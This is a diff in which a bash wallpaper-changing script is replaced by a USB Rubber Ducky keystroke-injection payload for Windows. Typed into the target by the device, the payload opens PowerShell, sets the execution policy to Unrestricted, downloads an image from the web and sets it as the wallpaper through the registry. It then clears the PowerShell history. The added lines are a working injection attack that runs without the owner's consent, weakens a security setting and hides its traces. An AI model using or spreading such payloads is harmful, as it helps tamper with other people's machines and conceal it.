@@ -1,9 +1,38 @@
-#!/bin/bash
-wallpaperdir="$HOME/wallpaper"
-
-files=($wallpaperdir/*)
-randompic=`printf "%s\n" "${files[RANDOM % ${#files[@]}]}"`
-
-echo -e "# xfce backdrop list\n$randompic">$HOME/.config/xfce4/desktop/backdrop.list
-xfdesktop --reloady
-
+DELAY 100000
+GUI r
+DELAY 1000
+STRING powershell.exe
+ENTER
+DELAY 1000
+STRING Set-ExecutionPolicy -Scope CurrentUser Unrestricted
+ENTER 
+DELAY 1000
+STRING $url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT6QeqGrKWAIXKjvaC_vTVHVP51FM7hZnsbGg&usqp=CAU"
+ENTER 
+DELAY 1000
+STRING cd ~
+ENTER 
+DELAY 1000
+STRING cd Desktop
+ENTER 
+DELAY 1000
+STRING $wc = New-Object System.Net.WebClient
+ENTER 
+DELAY 1000
+STRING $currentPicture = "$(Pwd)\bg.jpg"
+ENTER 
+DELAY 1000
+STRING $wc.DownloadFile($url, $currentPicture)
+ENTER 
+DELAY 1000
+STRING set-itemproperty -path "HKCU:Control Panel\Desktop" -name WallPaper "$currentPicture"
+ENTER 
+DELAY 1000
+STRING RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
+ENTER 
+DELAY 1000
+STRING Clear-History
+ENTER 
+DELAY 1000
+STRING exit
+ENTER 
